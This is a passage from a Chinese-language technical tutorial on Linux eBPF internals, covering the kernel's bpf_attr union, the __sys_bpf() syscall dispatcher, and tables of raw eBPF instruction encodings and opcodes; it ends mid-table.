</span><span style="color:#c0c5ce;">		__aligned_u64	keys;
</span><span style="color:#c0c5ce;">		__aligned_u64	values;
</span><span style="color:#c0c5ce;">		__u32		count;		</span><span style="color:#65737e;">/* input/output:
</span><span style="color:#65737e;">						 * input: # of key/value
</span><span style="color:#65737e;">						 * elements
</span><span style="color:#65737e;">						 * output: # of filled elements
</span><span style="color:#65737e;">						 */
</span><span style="color:#c0c5ce;">		__u32		map_fd;
</span><span style="color:#c0c5ce;">		__u64		elem_flags;
</span><span style="color:#c0c5ce;">		__u64		flags;
</span><span style="color:#c0c5ce;">	} batch;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_PROG_LOAD 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__u32		prog_type;	</span><span style="color:#65737e;">/* one of enum bpf_prog_type */
</span><span style="color:#c0c5ce;">		__u32		insn_cnt;
</span><span style="color:#c0c5ce;">		__aligned_u64	insns;
</span><span style="color:#c0c5ce;">		__aligned_u64	license;
</span><span style="color:#c0c5ce;">		__u32		log_level;	</span><span style="color:#65737e;">/* verbosity level of verifier */
</span><span style="color:#c0c5ce;">		__u32		log_size;	</span><span style="color:#65737e;">/* size of user buffer */
</span><span style="color:#c0c5ce;">		__aligned_u64	log_buf;	</span><span style="color:#65737e;">/* user supplied buffer */
</span><span style="color:#c0c5ce;">		__u32		kern_version;	</span><span style="color:#65737e;">/* not used */
</span><span style="color:#c0c5ce;">		__u32		prog_flags;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">		prog_name[BPF_OBJ_NAME_LEN];
</span><span style="color:#c0c5ce;">		__u32		prog_ifindex;	</span><span style="color:#65737e;">/* ifindex of netdev to prep for */
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* For some prog types expected attach type must be known at
</span><span style="color:#65737e;">		 * load time to verify attach type specific parts of prog
</span><span style="color:#65737e;">		 * (context accesses, allowed helpers, etc).
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		__u32		expected_attach_type;
</span><span style="color:#c0c5ce;">		__u32		prog_btf_fd;	</span><span style="color:#65737e;">/* fd pointing to BTF type data */
</span><span style="color:#c0c5ce;">		__u32		func_info_rec_size;	</span><span style="color:#65737e;">/* userspace bpf_func_info size */
</span><span style="color:#c0c5ce;">		__aligned_u64	func_info;	</span><span style="color:#65737e;">/* func info */
</span><span style="color:#c0c5ce;">		__u32		func_info_cnt;	</span><span style="color:#65737e;">/* number of bpf_func_info records */
</span><span style="color:#c0c5ce;">		__u32		line_info_rec_size;	</span><span style="color:#65737e;">/* userspace bpf_line_info size */
</span><span style="color:#c0c5ce;">		__aligned_u64	line_info;	</span><span style="color:#65737e;">/* line info */
</span><span style="color:#c0c5ce;">		__u32		line_info_cnt;	</span><span style="color:#65737e;">/* number of bpf_line_info records */
</span><span style="color:#c0c5ce;">		__u32		attach_btf_id;	</span><span style="color:#65737e;">/* in-kernel BTF type id to attach to */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* valid prog_fd to attach to bpf prog */
</span><span style="color:#c0c5ce;">			__u32		attach_prog_fd;
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* or valid module BTF object fd or 0 to attach to vmlinux */
</span><span style="color:#c0c5ce;">			__u32		attach_btf_obj_fd;
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">		__u32		core_relo_cnt;	</span><span style="color:#65737e;">/* number of bpf_core_relo */
</span><span style="color:#c0c5ce;">		__aligned_u64	fd_array;	</span><span style="color:#65737e;">/* array of FDs */
</span><span style="color:#c0c5ce;">		__aligned_u64	core_relos;
</span><span style="color:#c0c5ce;">		__u32		core_relo_rec_size; </span><span style="color:#65737e;">/* sizeof(struct bpf_core_relo) */
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_OBJ_* 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__aligned_u64	pathname;
</span><span style="color:#c0c5ce;">		__u32		bpf_fd;
</span><span style="color:#c0c5ce;">		__u32		file_flags;
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_PROG_ATTACH/DETACH 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__u32		target_fd;	</span><span style="color:#65737e;">/* container object to attach to */
</span><span style="color:#c0c5ce;">		__u32		attach_bpf_fd;	</span><span style="color:#65737e;">/* eBPF program to attach */
</span><span style="color:#c0c5ce;">		__u32		attach_type;
</span><span style="color:#c0c5ce;">		__u32		attach_flags;
</span><span style="color:#c0c5ce;">		__u32		replace_bpf_fd;	</span><span style="color:#65737e;">/* previously attached eBPF
</span><span style="color:#65737e;">						 * program to replace if
</span><span style="color:#65737e;">						 * BPF_F_REPLACE is used
</span><span style="color:#65737e;">						 */
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_PROG_TEST_RUN 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__u32		prog_fd;
</span><span style="color:#c0c5ce;">		__u32		retval;
</span><span style="color:#c0c5ce;">		__u32		data_size_in;	</span><span style="color:#65737e;">/* input: len of data_in */
</span><span style="color:#c0c5ce;">		__u32		data_size_out;	</span><span style="color:#65737e;">/* input/output: len of data_out
</span><span style="color:#65737e;">						 *   returns ENOSPC if data_out
</span><span style="color:#65737e;">						 *   is too small.
</span><span style="color:#65737e;">						 */
</span><span style="color:#c0c5ce;">		__aligned_u64	data_in;
</span><span style="color:#c0c5ce;">		__aligned_u64	data_out;
</span><span style="color:#c0c5ce;">		__u32		repeat;
</span><span style="color:#c0c5ce;">		__u32		duration;
</span><span style="color:#c0c5ce;">		__u32		ctx_size_in;	</span><span style="color:#65737e;">/* input: len of ctx_in */
</span><span style="color:#c0c5ce;">		__u32		ctx_size_out;	</span><span style="color:#65737e;">/* input/output: len of ctx_out
</span><span style="color:#65737e;">						 *   returns ENOSPC if ctx_out
</span><span style="color:#65737e;">						 *   is too small.
</span><span style="color:#65737e;">						 */
</span><span style="color:#c0c5ce;">		__aligned_u64	ctx_in;
</span><span style="color:#c0c5ce;">		__aligned_u64	ctx_out;
</span><span style="color:#c0c5ce;">		__u32		flags;
</span><span style="color:#c0c5ce;">		__u32		cpu;
</span><span style="color:#c0c5ce;">		__u32		batch_size;
</span><span style="color:#c0c5ce;">	} test;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_*_GET_*_ID 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			__u32		start_id;
</span><span style="color:#c0c5ce;">			__u32		prog_id;
</span><span style="color:#c0c5ce;">			__u32		map_id;
</span><span style="color:#c0c5ce;">			__u32		btf_id;
</span><span style="color:#c0c5ce;">			__u32		link_id;
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">		__u32		next_id;
</span><span style="color:#c0c5ce;">		__u32		open_flags;
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_OBJ_GET_INFO_BY_FD 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__u32		bpf_fd;
</span><span style="color:#c0c5ce;">		__u32		info_len;
</span><span style="color:#c0c5ce;">		__aligned_u64	info;
</span><span style="color:#c0c5ce;">	} info;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* BPF_PROG_QUERY 命令所使用的匿名结构体 */
</span><span style="color:#c0c5ce;">		__u32		target_fd;	</span><span style="color:#65737e;">/* container object to query */
</span><span style="color:#c0c5ce;">		__u32		attach_type;
</span><span style="color:#c0c5ce;">		__u32		query_flags;
</span><span style="color:#c0c5ce;">		__u32		attach_flags;
</span><span style="color:#c0c5ce;">		__aligned_u64	prog_ids;
</span><span style="color:#c0c5ce;">		__u32		prog_cnt;
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* output: per-program attach_flags.
</span><span style="color:#65737e;">		 * not allowed to be set during effective query.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		__aligned_u64	prog_attach_flags;
</span><span style="color:#c0c5ce;">	} query;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* anonymous struct used by BPF_RAW_TRACEPOINT_OPEN command */
</span><span style="color:#c0c5ce;">		__u64 name;
</span><span style="color:#c0c5ce;">		__u32 prog_fd;
</span><span style="color:#c0c5ce;">	} raw_tracepoint;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* anonymous struct for BPF_BTF_LOAD */
</span><span style="color:#c0c5ce;">		__aligned_u64	btf;
</span><span style="color:#c0c5ce;">		__aligned_u64	btf_log_buf;
</span><span style="color:#c0c5ce;">		__u32		btf_size;
</span><span style="color:#c0c5ce;">		__u32		btf_log_size;
</span><span style="color:#c0c5ce;">		__u32		btf_log_level;
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		__u32		pid;		</span><span style="color:#65737e;">/* input: pid */
</span><span style="color:#c0c5ce;">		__u32		fd;		</span><span style="color:#65737e;">/* input: fd */
</span><span style="color:#c0c5ce;">		__u32		flags;		</span><span style="color:#65737e;">/* input: flags */
</span><span style="color:#c0c5ce;">		__u32		buf_len;	</span><span style="color:#65737e;">/* input/output: buf len */
</span><span style="color:#c0c5ce;">		__aligned_u64	buf;		</span><span style="color:#65737e;">/* input/output:
</span><span style="color:#65737e;">						 *   tp_name for tracepoint
</span><span style="color:#65737e;">						 *   symbol for kprobe
</span><span style="color:#65737e;">						 *   filename for uprobe
</span><span style="color:#65737e;">						 */
</span><span style="color:#c0c5ce;">		__u32		prog_id;	</span><span style="color:#65737e;">/* output: prod_id */
</span><span style="color:#c0c5ce;">		__u32		fd_type;	</span><span style="color:#65737e;">/* output: BPF_FD_TYPE_* */
</span><span style="color:#c0c5ce;">		__u64		probe_offset;	</span><span style="color:#65737e;">/* output: probe_offset */
</span><span style="color:#c0c5ce;">		__u64		probe_addr;	</span><span style="color:#65737e;">/* output: probe_addr */
</span><span style="color:#c0c5ce;">	} task_fd_query;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* struct used by BPF_LINK_CREATE command */
</span><span style="color:#c0c5ce;">		__u32		prog_fd;	</span><span style="color:#65737e;">/* eBPF program to attach */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			__u32		target_fd;	</span><span style="color:#65737e;">/* object to attach to */
</span><span style="color:#c0c5ce;">			__u32		target_ifindex; </span><span style="color:#65737e;">/* target ifindex */
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">		__u32		attach_type;	</span><span style="color:#65737e;">/* attach type */
</span><span style="color:#c0c5ce;">		__u32		flags;		</span><span style="color:#65737e;">/* extra flags */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			__u32		target_btf_id;	</span><span style="color:#65737e;">/* btf_id of target to attach to */
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">				__aligned_u64	iter_info;	</span><span style="color:#65737e;">/* extra bpf_iter_link_info */
</span><span style="color:#c0c5ce;">				__u32		iter_info_len;	</span><span style="color:#65737e;">/* iter_info length */
</span><span style="color:#c0c5ce;">			};
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">				</span><span style="color:#65737e;">/* black box user-provided value passed through
</span><span style="color:#65737e;">				 * to BPF program at the execution time and
</span><span style="color:#65737e;">				 * accessible through bpf_get_attach_cookie() BPF helper
</span><span style="color:#65737e;">				 */
</span><span style="color:#c0c5ce;">				__u64		bpf_cookie;
</span><span style="color:#c0c5ce;">			} perf_event;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">				__u32		flags;
</span><span style="color:#c0c5ce;">				__u32		cnt;
</span><span style="color:#c0c5ce;">				__aligned_u64	syms;
</span><span style="color:#c0c5ce;">				__aligned_u64	addrs;
</span><span style="color:#c0c5ce;">				__aligned_u64	cookies;
</span><span style="color:#c0c5ce;">			} kprobe_multi;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">				</span><span style="color:#65737e;">/* this is overlaid with the target_btf_id above. */
</span><span style="color:#c0c5ce;">				__u32		target_btf_id;
</span><span style="color:#c0c5ce;">				</span><span style="color:#65737e;">/* black box user-provided value passed through
</span><span style="color:#65737e;">				 * to BPF program at the execution time and
</span><span style="color:#65737e;">				 * accessible through bpf_get_attach_cookie() BPF helper
</span><span style="color:#65737e;">				 */
</span><span style="color:#c0c5ce;">				__u64		cookie;
</span><span style="color:#c0c5ce;">			} tracing;
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">	} link_create;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* struct used by BPF_LINK_UPDATE command */
</span><span style="color:#c0c5ce;">		__u32		link_fd;	</span><span style="color:#65737e;">/* link fd */
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* new program fd to update link with */
</span><span style="color:#c0c5ce;">		__u32		new_prog_fd;
</span><span style="color:#c0c5ce;">		__u32		flags;		</span><span style="color:#65737e;">/* extra flags */
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* expected link&#39;s program fd; is specified only if
</span><span style="color:#65737e;">		 * BPF_F_REPLACE flag is set in flags */
</span><span style="color:#c0c5ce;">		__u32		old_prog_fd;
</span><span style="color:#c0c5ce;">	} link_update;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		__u32		link_fd;
</span><span style="color:#c0c5ce;">	} link_detach;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* struct used by BPF_ENABLE_STATS command */
</span><span style="color:#c0c5ce;">		__u32		type;
</span><span style="color:#c0c5ce;">	} enable_stats;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* struct used by BPF_ITER_CREATE command */
</span><span style="color:#c0c5ce;">		__u32		link_fd;
</span><span style="color:#c0c5ce;">		__u32		flags;
</span><span style="color:#c0c5ce;">	} iter_create;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* struct used by BPF_PROG_BIND_MAP command */
</span><span style="color:#c0c5ce;">		__u32		prog_fd;
</span><span style="color:#c0c5ce;">		__u32		map_fd;
</span><span style="color:#c0c5ce;">		__u32		flags;		</span><span style="color:#65737e;">/* extra flags */
</span><span style="color:#c0c5ce;">	} prog_bind_map;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">__attribute__</span><span style="color:#c0c5ce;">((aligned(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)));
</span></pre>
<h3 id="sys-bpf-xi-tong-diao-yong-he-xin-han-shu">__sys_bpf() 系统调用核心函数</h3><p>定义于<code>kernel/bpf/syscall.c</code>
核心是一个巨大的switch</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">__sys_bpf</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, bpfptr_t </span><span style="color:#bf616a;">uattr</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> capable;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	capable = </span><span style="color:#8fa1b3;">bpf_capable</span><span style="color:#c0c5ce;">() || !sysctl_unprivileged_bpf_disabled;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Intent here is for unprivileged_bpf_disabled to block key object
</span><span style="color:#65737e;">	 * creation commands for unprivileged users; other actions depend
</span><span style="color:#65737e;">	 * of fd availability and access to bpffs, so are dependent on
</span><span style="color:#65737e;">	 * object creation success.  Capabilities are later verified for
</span><span style="color:#65737e;">	 * operations such as load and map create, so even with unprivileged
</span><span style="color:#65737e;">	 * BPF disabled, capability checks are still carried out for these
</span><span style="color:#65737e;">	 * and other operations.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!capable &amp;&amp;
</span><span style="color:#c0c5ce;">	    (cmd == BPF_MAP_CREATE || cmd == BPF_PROG_LOAD))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EPERM;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">bpf_check_uarg_tail_zero</span><span style="color:#c0c5ce;">(uattr, sizeof(attr), size);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">	size = </span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(u32, size, sizeof(attr));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* copy attributes from user space, may be less than sizeof(bpf_attr) */
</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;attr, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(attr));
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_bpfptr</span><span style="color:#c0c5ce;">(&amp;attr, uattr, size) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">security_bpf</span><span style="color:#c0c5ce;">(cmd, &amp;attr, size);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(cmd) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_MAP_CREATE:
</span><span style="color:#c0c5ce;">		err = </span><span style="color:#8fa1b3;">map_create</span><span style="color:#c0c5ce;">(&amp;attr);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		err = -EINVAL;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">SYSCALL_DEFINE3</span><span style="color:#c0c5ce;">(bpf, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">, cmd, </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *, uattr, </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">, size)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">__sys_bpf</span><span style="color:#c0c5ce;">(cmd, </span><span style="color:#8fa1b3;">USER_BPFPTR</span><span style="color:#c0c5ce;">(uattr), size);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="raw-ebpf-cheng-xu-bian-xie-ru-men">raw eBPF 程序编写入门</h2><h3 id="ebpfzhi-ling-ge-shi">eBPF指令格式</h3><p>RISC指令集 单条指令长度为8字节</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_insn {
</span><span style="color:#c0c5ce;">	__u8	code;		</span><span style="color:#65737e;">/* opcode */
</span><span style="color:#c0c5ce;">	__u8	dst_reg:</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;	</span><span style="color:#65737e;">/* dest register */
</span><span style="color:#c0c5ce;">	__u8	src_reg:</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">;	</span><span style="color:#65737e;">/* source register */
</span><span style="color:#c0c5ce;">	__s16	off;		</span><span style="color:#65737e;">/* signed offset */
</span><span style="color:#c0c5ce;">	__s32	imm;		</span><span style="color:#65737e;">/* signed immediate constant */
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>两种编码模式：</p>
<ul>
<li>基础编码，单条指令64bit</li>
<li>宽指令编码，在基础编码后添加一个64bit立即数，单条指令128bit</li>
</ul>
<p>基础编码指令格式如下：</p>
<table><thead><tr><th>长度</th><th>8bits</th><th>4bits</th><th>4bits</th><th>16bits</th><th>32bits</th></tr></thead><tbody>
<tr><th>含义</th><th>opcode</th><th>dst_reg</th><th>src_reg</th><th>off(有符号偏移)</th><th>imm(有符号32位立即数)</th></tr>
<tr><th>opcode域长度为8bit，低3位固定表示指令类型，剩下高5位根据类型不同用途也不同</th><th></th><th></th><th></th><th></th><th></th></tr>
</tbody></table>
<table><thead><tr><th>类型</th><th>值</th><th>描述</th></tr></thead><tbody>
<tr><th>BPF_LD</th><th>0x00</th><th>只能用于宽指令，从 <code>imm64</code> 中加载数据到寄存器</th></tr>
<tr><th>BPF_LDX</th><th>0x01</th><th>从内存中加载数据到 <code>dst_reg</code></th></tr>
<tr><th>BPF_ST</th><th>0x02</th><th>把 <code>imm32</code> 数据保存到内存中</th></tr>
<tr><th>BPF_STX</th><th>0x03</th><th>把 <code>src_reg</code> 寄存器数据保存到内存</th></tr>
<tr><th>BPF_ALU</th><th>0x04</th><th>32bit 算术运算</th></tr>
<tr><th>BPF_JMP</th><th>0x05</th><th>64bit 跳转操作</th></tr>
<tr><th>BPF_JMP32</th><th>0x06</th><th>32bit 跳转操作</th></tr>
<tr><th>BPF_ALU64</th><th>0x07</th><th>64bit 算术运算</th></tr>
</tbody></table>
<blockquote>
<p>在 classic BPF 中 <code>0x06</code> 为函数返回指令 <code>BPF_RET</code> ，<code>0x07</code> 为寄存器交换指令 <code>BPF_MISC</code> （cBPF 只有 <code>A</code> 和 <code>X</code>两个寄存器）</p>
</blockquote>
<p>对于 算术 &amp; 跳转指令：</p>
<table><thead><tr><th>4 bit</th><th>1 bit</th><th>3 bit</th></tr></thead><tbody>
<tr><th>operation code （操作代码）</th><th>source（源）</th><th>instruction class （指令类型）</th></tr>
<tr><th>下午具体解读指令中各字段含义</th><th></th><th></th></tr>
<tr><th>对于算术指令 操作码类型如下</th><th></th><th></th></tr>
</tbody></table>
<table><thead><tr><th>指令类型</th><th>操作代码</th><th>值</th><th>描述</th></tr></thead><tbody>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_ADD</th><th>0x00</th><th>dst += src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_SUB</th><th>0x10</th><th>dst -= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_MUL</th><th>0x20</th><th>dst *= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_DIV</th><th>0x30</th><th>dst /= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_OR</th><th>0x40</th><th>dst |= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_AND</th><th>0x50</th><th>dst &amp;= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_LSH</th><th>0x60</th><th>dst &lt;&lt;= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_RSH</th><th>0x70</th><th>dst &gt;&gt;= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_NEG</th><th>0x80</th><th>dst = ~src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_MOD</th><th>0x90</th><th>dst %= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_XOR</th><th>0xA0</th><th>dst ^= src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_MOV</th><th>0xB0</th><th>dst = src</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_ARSH</th><th>0xC0</th><th>算术右移操作（正数补 0 负数补 1 ）</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_END</th><th>0xD0</th><th>字节序转换</th></tr>
</tbody></table>
<p>对于跳转指令而言有如下类型：</p>
<table><thead><tr><th>**  <br>指令类型**</th><th><strong>操作代码</strong></th><th><strong>值</strong></th><th><strong>描述</strong></th><th>备注</th></tr></thead><tbody>
<tr><th>BPF_JMP</th><th>BPF_JA</th><th>0x00</th><th>PC += off</th><th>仅用于 BPF_JMP</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JEQ</th><th>0x10</th><th>PC += off if dst == src</th><th></th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JGT</th><th>0x20</th><th>PC += off if dst &gt; src</th><th></th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JGE</th><th>0x30</th><th>PC += off if dst &gt;= src</th><th></th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JSET</th><th>0x40</th><th>PC += off if dst &amp; src</th><th></th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JNE</th><th>0x50</th><th>PC += off if dst != src</th><th>仅 eBPF：不等时跳转</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JSGT</th><th>0x60</th><th>PC += off if dst &gt; src</th><th>仅 eBPF：有符号 ‘&gt;’</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JSGE</th><th>0x70</th><th>PC += off if dst &gt;= src</th><th>仅 eBPF：有符号 ‘&gt;=’</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_CALL</th><th>0x80</th><th>函数调用</th><th>仅 eBPF：函数调用</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_EXIT</th><th>0x90</th><th>函数或者程序返回</th><th>仅 eBPF：函数返回</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JLT</th><th>0xA0</th><th>PC += off if dst &lt; src</th><th>仅 eBPF：无符号 ‘&lt;’</th></tr>
